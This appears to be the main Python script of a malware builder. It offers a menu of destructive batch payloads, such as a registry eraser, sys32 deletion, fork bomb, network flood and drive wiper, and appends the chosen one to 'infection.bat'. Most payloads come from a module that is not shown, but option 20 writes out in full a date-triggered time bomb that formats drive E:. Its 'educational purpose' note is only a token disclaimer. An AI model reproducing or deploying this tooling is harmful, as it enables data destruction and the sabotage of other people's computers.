import os

from files.colors import *
from files.sprint import sprint

from scripts.menu import menu, sleep
from files.banner import banner, clear

clear()

if os.path.exists('insfaction.bat'):
    os.remove('infection.bat')

banner()
sprint(ly + "\n\t\tPreparing Database...")
sleep(2)
sprint(ly + "\n\n\t\tAlmost Done...")
sleep(2)
sprint(c + "\t\tLoaded Successfully")
print(c + "\n\nNote: " + lr + "Use this tool for educational purpose.\n\t")
sleep(1)
sprint(ly + "\t\tStarting Builder.....")


def call():
    sleep(1)
    print(lc + f"\n{w}[{r}~{w}]{lg} Virus prepared successfully!")

    sprint(
        ran + f"\n{w}[{c}>{w}]{ran}To access the infected file in termux\n" + c + f"{w}[{c}>{w}]{ran}Type 'cp infection.bat /sdcard'"
        + lr + f"\n{w}[{c}>{w}]{ran}In Kali type 'cp infection.bat /'TYPE PATH'")


def write(data, file='infection.bat'):
    with open(file, 'a+') as vir:
        vir.write(data)


def Build(vir_name):
    sprint(ran + "\nPreparing...")
    write(vir_name)
    call()


def builder():
    menu()
    choice = input(lg + "root@Infection~ " + ly)

    if choice == "1":
        exit()

    elif choice == "2":
        from scripts.collector import application_bomber_read
        Build(application_bomber_read)

    elif choice == "3":
        from scripts.collector import auto_shutdown_read
        Build(auto_shutdown_read)

    elif choice == "4":
        from scripts.collector import caps_toggle_read
        Build(caps_toggle_read)

    elif choice == "5":
        from scripts.collector import danger_zone_read
        Build(danger_zone_read)

    elif choice == "6":
        from scripts.collector import reg_eraser_read
        Build(reg_eraser_read)

    elif choice == "7":
        from scripts.collector import sys32_read
        Build(sys32_read)

    elif choice == "8":
        from scripts.collector import drive_read
        Build(drive_read)

    elif choice == "9":
        from scripts.collector import forkBomb_read
        Build(forkBomb_read)

    elif choice == "10":
        from scripts.collector import internet_disabler_read
        Build(internet_disabler_read)

    elif choice == "11":
        from scripts.collector import network_flood_read
        Build(network_flood_read)

    elif choice == "12":
        from scripts.collector import pc_crash_read
        Build(pc_crash_read)

    elif choice == "13":
        from scripts.collector import pc_crash2_read
        Build(pc_crash2_read)

    elif choice == "14":
        from scripts.collector import shutdown_read
        Build(shutdown_read)

    elif choice == "15":
        from scripts.collector import up_internet_read
        Build(up_internet_read)

    elif choice == "16":
        from scripts.collector import stop_internet_read
        Build(stop_internet_read)

    elif choice == "17":
        from scripts.collector import sys_eraser_read
        Build(sys_eraser_read)

    elif choice == "18":
        from scripts.collector import sys_melter_read
        Build(sys_melter_read)

    elif choice == "19":
        from scripts.collector import the_matrix_read
        Build(the_matrix_read)

    elif choice == "20":
        date = input(ran + "Enter date of explosion [Eg: 30/12/2021] :")
        time_bomb_read = f"""
        If %date% NEQ {date} goto exit
        format E: /y >nul
        :exit
        exit
        """
        with open("infection.bat", "a+") as infection:
            infection.write(time_bomb_read)

        sprint(ran + "\nPreparing...")
        call()


    else:
        sprint(r + "Successfully typed INVALID OPTION! ")
        pass


no = ['n', 'no']
yes = ['y', 'yes']

cont = ""
while cont not in no:
    builder()
    cont = input(ran + "Do you want to continue? [y/n]:")

